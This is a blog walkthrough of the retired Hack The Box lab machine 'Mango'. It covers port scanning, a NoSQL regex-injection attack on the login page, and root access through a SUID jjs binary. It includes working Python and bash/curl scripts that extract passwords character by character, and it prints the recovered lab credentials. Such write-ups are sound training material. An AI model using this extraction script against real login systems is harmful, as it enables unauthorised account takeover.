---
layout: post
title: "Mango: Hack The Box Walkthrough"
date: 2020-04-18 16:02:39 +0000
last_modified_at: 2020-04-18 16:02:39 +0000
category: Walkthrough
tags: ["Hack The Box", Mango, retired, Linux, Medium]
comments: true
image:
  feature: mango-htb-walkthrough.jpg
  credit: terimakasih0 / Pixabay
  creditlink: https://pixabay.com/photos/mangoes-fruit-mango-food-tropical-1320111/
---

This post documents the complete walkthrough of Mango, a retired vulnerable [VM][1] created by [MrR3boot][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Mango is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.162 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-29 09:09:47 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.162                                    
Discovered open port 22/tcp on 10.10.10.162                                    
Discovered open port 443/tcp on 10.10.10.162
```

OK, nothing out of the blue. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,443 -A --reason -oN nmap.txt 10.10.10.162
...
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
```

It's best to pop `staging-order.mango.htb` and `mango.htb` into `/etc/hosts`. And this is how the site looks like for `http` and `https` respectively.

{% include image.html image_alt="c82ceef1.png" image_src="/assets/images/posts/mango-htb-walkthrough/c82ceef1.png" %}

Sweet and juicy indeed!

{% include image.html image_alt="ef1f2e57.png" image_src="/assets/images/posts/mango-htb-walkthrough/ef1f2e57.png" %}

Simple and clean search! Well, in the search page, there's a link to Analytics.

{% include image.html image_alt="fccb8eca.png" image_src="/assets/images/posts/mango-htb-walkthrough/fccb8eca.png" %}

Well, I managed to get Flexmonster to work by including `codepen.io` to `/etc/hosts`.

{% include image.html image_alt="fd20ca62.png" image_src="/assets/images/posts/mango-htb-walkthrough/fd20ca62.png" %}

I don't think `analytics.php` is the way in. I've to think of something else...

### "Extracting" the juice out of the mango

This is when the name of the box, Mango, reminded of me of MongoDB, which uses NoSQL. Although that frees MongoDB from SQL injection attacks, other form of attacks through the web application are still possible. Using the `$ne` and `$regex` operators, we are able to extract sensitive information from MongoDB even though we may not have direct access to it. It took me a while to chance upon this interesting behavior with the site.

{% include image.html image_alt="99185636.png" image_src="/assets/images/posts/mango-htb-walkthrough/99185636.png" %}

When the username and password matches a regular expression, a 302 response is seen instead of a 200. Armed with this insight, we can write a script to extract pertinent information one character at a time.

<div class="filename"><span>extract.py</span></div>

```python
import os
import string

password = ''
charset  = string.ascii_letters + string.digits + string.punctuation

while True:
    for c in charset:
        if c not in ['*','+','.','?','|', '#', '&', '$']:
            payload = password + c
            r = os.system("./brute.sh '" + payload + "'")
            if r == 0:
                print("Found one more char : %s" % (password + c))
                password += c
                break
```

As you can see from above, I'm making use of Python to produce the character set while using `brute.sh` as the main driver for HTTP requests (because I love `curl`!).

<div class="filename"><span>brute.sh</span></div>

```bash
#!/bin/bash

HOST=staging-order.mango.htb
USER=mango
PASS=$1
TEMP=$(mktemp -u)

curl -s \
     -c $TEMP \
     -o /dev/null \
     -d "username=${USER}&password=whatever&login=login" \
     "http://$HOST/"

response=$(curl -s \
                -b $TEMP \
                -o /dev/null \
                -w "%{http_code}" \
                -d "username=$USER&password[\$regex]=^$PASS" \
    "http://$HOST/index.php?type=embed")

if [ "$response" -eq 302 ]; then
  rm -rf $TEMP
  exit 0
fi  

rm -rf $TEMP; exit 1
```

Long story short, early on, I've already established that there are two users to the site: `admin` and `mango`. Here's the script trying to extract the password of `mango`.

{% include image.html image_alt="bc893547.png" image_src="/assets/images/posts/mango-htb-walkthrough/bc893547.png" %}

This must be the ugliest script I've written. It's not pretty but it gets the job done. The password of `mango` is `h3mXK8RhU~f{]f5H`. What a password!

### Low-Privilege Shell

Armed with `mango`'s password, we can log in to her account.

{% include image.html image_alt="7d461387.png" image_src="/assets/images/posts/mango-htb-walkthrough/7d461387.png" %}

See how evil is the password of `admin`, with all the different punctuations!

{% include image.html image_alt="5d0f809e.png" image_src="/assets/images/posts/mango-htb-walkthrough/5d0f809e.png" %}

I was able to `su` to `admin`'s account with his password (`t9KcS3>!0B#2`).

{% include image.html image_alt="df21d8b0.png" image_src="/assets/images/posts/mango-htb-walkthrough/df21d8b0.png" %}

With that, the file `user.txt` is at `admin`'s home directory.

{% include image.html image_alt="0c0ff65a.png" image_src="/assets/images/posts/mango-htb-walkthrough/0c0ff65a.png" %}

## Privilege Escalation

During enumeration of `admin`'s account, you'll notice that a SUID executable at `/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs`.

{% include image.html image_alt="cb10a974.png" image_src="/assets/images/posts/mango-htb-walkthrough/cb10a974.png" %}

Notice that the executable is also `setgid` to the `admin` group. Something tells me this is the right way to go.

### Promoting `admin` to the `sudo` group

According to the Java [documentation](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jjs.html), `jjs` invokes the Nashorn JavaScript engine, which means the executable is able to run JavaScript files. How cool is that? Well, JavaScript files aside, this executable can also run Java code.

Towards that end, let's add `admin` to the `sudo` group. And from there, we can `sudo` ourselves to `root`.

{% include image.html image_alt="aefb1fc8.png" image_src="/assets/images/posts/mango-htb-walkthrough/aefb1fc8.png" %}

Let's see if `admin` is really in the `sudo` group.

{% include image.html image_alt="110e9ef4.png" image_src="/assets/images/posts/mango-htb-walkthrough/110e9ef4.png" %}

Awesome. All that's left is `sudo`.

{% include image.html image_alt="84e4a71f.png" image_src="/assets/images/posts/mango-htb-walkthrough/84e4a71f.png" %}

That's it. We are done.

{% include image.html image_alt="95d5153c.png" image_src="/assets/images/posts/mango-htb-walkthrough/95d5153c.png" %}

[1]: https://www.hackthebox.eu/home/machines/profile/214
[2]: https://www.hackthebox.eu/home/users/profile/13531
[3]: https://www.hackthebox.eu/
